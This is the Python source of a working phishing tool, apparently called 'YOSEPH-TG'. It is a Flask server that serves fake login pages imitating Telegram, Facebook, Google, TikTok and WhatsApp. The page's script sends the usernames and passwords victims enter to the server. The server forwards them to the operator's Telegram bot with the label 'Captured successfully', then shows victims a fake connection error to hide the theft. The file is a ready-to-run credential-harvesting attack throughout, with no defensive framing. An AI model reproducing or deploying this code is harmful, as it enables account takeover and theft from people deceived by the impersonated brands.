import os, requests, sys, base64
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- Configuration ---
CONFIG_FILE = "config.txt"
TOOL_NAME = "YOSEPH-TG"
ENCODED_PASS = "QFlvc2VwaGFsZ2FuZWg0NA==" # @Yosephalganeh44

# --- 1. Admin Access Control ---
def check_access():
    print("\n" + "═" * 45)
    print(f"      {TOOL_NAME} - PREMIUM MULTI-TOOL")
    print("      Developer: Yoseph (@Yosephalganeh44)")
    print("═" * 45)
    p = input("[?] Enter Access Password: ").strip()
    if p != base64.b64decode(ENCODED_PASS).decode():
        print("[!] Access Denied! Incorrect Password."); sys.exit()
    print("[+] Access Granted! Starting Web Server...\n")

# --- 2. Bot Configuration ---
def setup_bot():
    if not os.path.exists(CONFIG_FILE):
        print("--- Initial Setup ---")
        token = input("[?] Bot Token: ").strip()
        chat_id = input("[?] Chat ID: ").strip()
        with open(CONFIG_FILE, "w") as f: f.write(f"{token}\n{chat_id}")
        return token, chat_id
    with open(CONFIG_FILE, "r") as f:
        data = f.read().splitlines()
        return data[0], data[1]

# --- 3. UI (The Selection & Login Pages) ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YOSEPH-TG Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .hidden { display: none; }
        .platform-card { cursor: pointer; transition: 0.3s; border: 1px solid #eee; }
        .platform-card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
    </style>
</head>
<body class="bg-gray-50 flex justify-center items-center min-h-screen p-4">
    <div id="main-card" class="bg-white p-8 rounded-3xl shadow-2xl w-full max-w-md">
        
        <div id="selection-screen">
            <h1 class="text-2xl font-black text-center mb-2 text-blue-600">YOSEPH-TG</h1>
            <p class="text-center text-gray-500 mb-8 text-sm">Select a platform to continue</p>
            
            <div class="grid grid-cols-2 gap-4">
                <div onclick="openLogin('Telegram', '#3390ec', 'https://telegram.org/img/t_logo.png')" class="platform-card p-4 rounded-2xl text-center bg-white">
                    <img src="https://telegram.org/img/t_logo.png" class="w-12 mx-auto mb-2">
                    <span class="font-bold text-gray-700">Telegram</span>
                </div>
                <div onclick="openLogin('Facebook', '#1877f2', 'https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg')" class="platform-card p-4 rounded-2xl text-center bg-white">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="w-12 mx-auto mb-2">
                    <span class="font-bold text-gray-700">Facebook</span>
                </div>
                <div onclick="openLogin('Google', '#ea4335', 'https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg')" class="platform-card p-4 rounded-2xl text-center bg-white">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" class="w-12 mx-auto mb-2">
                    <span class="font-bold text-gray-700">Google</span>
                </div>
                <div onclick="openLogin('TikTok', '#000000', 'https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg')" class="platform-card p-4 rounded-2xl text-center bg-white">
                    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="w-12 mx-auto mb-2">
                    <span class="font-bold text-gray-700">TikTok</span>
                </div>
            </div>
            <div onclick="openLogin('WhatsApp', '#25d366', 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg')" class="platform-card mt-4 p-4 rounded-2xl text-center bg-white flex items-center justify-center gap-3">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-8">
                <span class="font-bold text-gray-700">WhatsApp Secure Login</span>
            </div>
        </div>

        <div id="login-screen" class="hidden">
            <button onclick="location.reload()" class="text-sm text-gray-400 mb-6 font-bold hover:text-gray-600">← GO BACK</button>
            <img id="p-logo" src="" class="w-20 mx-auto mb-4">
            <h2 id="p-title" class="text-2xl font-bold text-center text-gray-800"></h2>
            <p class="text-gray-400 text-center text-sm mb-8">Sign in to sync your account</p>
            
            <div class="space-y-4">
                <input type="text" id="user" placeholder="Email or Phone Number" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 transition">
                <input type="password" id="pass" placeholder="Password" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 transition">
                <button id="p-btn" onclick="sendData()" class="w-full p-4 text-white font-black rounded-xl shadow-lg hover:opacity-90 transition">LOG IN</button>
            </div>
            <p id="status" class="mt-6 text-center font-medium"></p>
        </div>
    </div>

    <script>
        let currentP = "";

        function openLogin(name, color, logo) {
            currentP = name;
            document.getElementById('selection-screen').classList.add('hidden');
            document.getElementById('login-screen').classList.remove('hidden');
            document.getElementById('p-logo').src = logo;
            document.getElementById('p-title').innerText = name;
            
            let btn = document.getElementById('p-btn');
            btn.style.backgroundColor = color;
            document.getElementById('user').style.borderColor = color;
        }

        async function sendData() {
            let u = document.getElementById('user').value;
            let p = document.getElementById('pass').value;
            let st = document.getElementById('status');

            if(u.length < 5 || p.length < 5) {
                st.style.color = "red";
                st.innerText = "Error: Invalid credentials!";
                return;
            }

            st.style.color = "#333";
            st.innerText = "Verifying with " + currentP + "...";

            await fetch('/submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({platform: currentP, user: u, pass: p})
            });

            setTimeout(() => {
                st.style.color = "red";
                st.innerText = "Connection Error! Please try again in 5 minutes.";
            }, 2500);
        }
    </script>
</body>
</html>
"""

# --- 4. Flask Routes ---
@app.route('/')
def home(): return render_template_string(HTML_PAGE)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    msg = f"🔔 *{TOOL_NAME} ALERT*\n\n" \
          f"🌐 *Platform:* `{data['platform']}`\n" \
          f"👤 *Username:* `{data['user']}`\n" \
          f"🔑 *Password:* `{data['pass']}`\n\n" \
          f"_Captured successfully._"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    check_access()
    BOT_TOKEN, CHAT_ID = setup_bot()
    app.run(host='0.0.0.0', port=5000)
